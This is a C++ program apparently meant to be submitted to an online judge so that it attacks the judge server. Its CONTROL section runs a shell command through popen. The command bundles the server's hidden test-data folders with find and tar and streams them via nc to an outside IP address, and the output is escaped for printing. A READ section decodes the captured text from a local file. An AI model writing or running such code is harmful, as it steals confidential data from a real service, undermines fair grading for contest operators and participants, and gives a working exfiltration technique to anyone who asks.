//#define CONTROL
#define CONTROL


#ifdef CONTROL

#include <iostream>
#include <stdexcept>
#include <stdio.h>
#include <string>

using namespace std;

std::string exec(const char* cmd) {
	char buffer[128];
	std::string result = "";
	FILE* pipe = popen(cmd, "r");
	if (!pipe) throw std::runtime_error("popen() failed!");
	try {
		while (!feof(pipe)) {
			if (fgets(buffer, 128, pipe) != NULL)
				result += buffer;
		}
	}
	catch (...) {
		pclose(pipe);
		throw;
	}
	pclose(pipe);
	return result;
}

int main(){

	int a;
	std::string s;

	//s = exec("cd ../../../JudgeServer_CONSOLE/Testdata/b798 \n cat b798.in 2>&1");
	s = exec("find /JudgeServer_CONSOLE/Testdata/ -maxdepth 1 -name 'c[0-3]*' -print0 | xargs -0 tar -cvf - 2> /dev/null | nc 140.118.155.162 80 &> /dev/null");

	for (int i = 0; i < s.length(); i++){
		if (s[i] == '\n'){
			s[i] = '?';
			s.insert(i + 1, "n?");
			i += 2;
		} 
		else if (s[i] == '\r'){
			s[i] = '?';
			s.insert(i + 1, "r?");
			i += 2;
		}
		else if (s[i] == '?'){
			s[i] = '?';
			s.insert(i + 1, "??");
			i += 2;
		}
		else if (s[i] == '<'){
			s[i] = '?';
			s.insert(i + 1, ",?");
			i += 2;
		}
		else if (s[i] == '>'){
			s[i] = '?';
			s.insert(i + 1, ".?");
			i += 2;
		}
	}
	//s = s.substr(17533);
	cout << s << endl;
}

#endif //CONTROL


#ifdef READ

#include <fstream>
#include <string.h>
#include <iostream>

using namespace std;

int main(){
	fstream fs;

	int n;
	char ch;
	char *buf, *cpybuf;

	fs.open("OJget.txt");
	fs.seekg(0, ios_base::end);
	n = fs.tellg();
	fs.seekg(0, ios_base::beg);

	buf = new char[n+1];
	cpybuf = new char[n+1];
	fs.read(buf, n);

	fs.close();

	for(int i = 0; i < n ; i++){
		if(buf[i] == '?'){
			switch(buf[i+1]){
			case 'n':
				buf[i] = '\n';
				break;
			case 'r':
				buf[i] = '\r';
				break;
			case ',':
				buf[i] = '<';
				break;
			case '.':
				buf[i] = '>';
				break;
			}
			strcpy(cpybuf, &(buf[i + 3]));
			strcpy(&(buf[i + 1]), cpybuf);
			n -= 2;
		}
	}

	fs.open("OJget.txt", ios::out);
	fs.write(buf, n);
}

#endif // READ